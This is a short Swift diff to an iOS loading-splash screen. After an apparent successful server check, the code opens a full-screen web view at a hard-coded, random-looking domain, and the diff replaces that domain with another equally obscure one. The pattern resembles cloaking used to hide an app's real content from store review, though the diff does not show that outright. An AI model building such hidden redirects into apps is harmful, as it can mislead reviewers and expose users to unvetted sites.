@@ -58,12 +58,13 @@ class LoadingSplash: UIViewController {
                     if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
                         appDelegate.restrictRotation = .all
                     }
-                    let link = "https://asdfgadfg.com/FwKy5W"
+                    let link = "https://splendidkmmaskj.com/8tdSJh"
                     activityIndicator.stopAnimating()
                     let vc = WebviewVC(url: URL(string: link)!)
                     vc.modalPresentationStyle = .fullScreen
                     self.present(vc, animated: true)
                 } else {
+                    print("no 200")
                     if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
                         appDelegate.restrictRotation = .portrait
                     }
